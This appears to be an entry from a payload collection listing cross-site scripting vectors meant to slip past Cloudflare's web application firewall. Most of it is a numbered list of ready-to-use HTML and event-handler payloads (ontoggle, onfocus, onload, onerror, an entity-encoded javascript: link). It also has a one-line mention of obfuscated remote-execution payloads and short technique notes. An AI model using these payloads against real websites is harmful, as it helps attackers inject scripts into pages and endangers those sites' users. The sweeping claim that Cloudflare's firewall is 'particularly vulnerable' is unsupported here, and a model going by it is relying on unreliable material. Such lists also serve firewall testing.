---
id: WAF-BYPASS-001
title: Cloudflare WAF Bypass Payloads
category: Known Bypasses
severity_range: Medium-Critical
---

# Cloudflare WAF Bypass Payloads

## XSS Bypasses

1. `<a href="j&tab;avascript&newline;:alert(1)" tabindex=1 autofocus>`
2. `<details open ontoggle=alert(1)>`
3. `<body onload=alert(1)>`
4. `<svg onload=alert(1)>`
5. `<iframe srcdoc="<img src=x onerror=alert(1)>">`
6. `<input autofocus onfocus=alert(1)>`
7. `<select autofocus onfocus=alert(1)>`
8. `<textarea autofocus onfocus=alert(1)>`
9. `<keygen autofocus onfocus=alert(1)>`
10. `<video><source onerror=alert(1)>`
11. `<audio><source onerror=alert(1)>`

## RCE Bypass

- Various server-side execution payloads using encoding/obfuscation

## Technique Notes

- Cloudflare's WAF is particularly vulnerable to event handler-based XSS (ontoggle, onfocus, onload)
- Using autofocus attribute with event handlers bypasses many signature-based rules
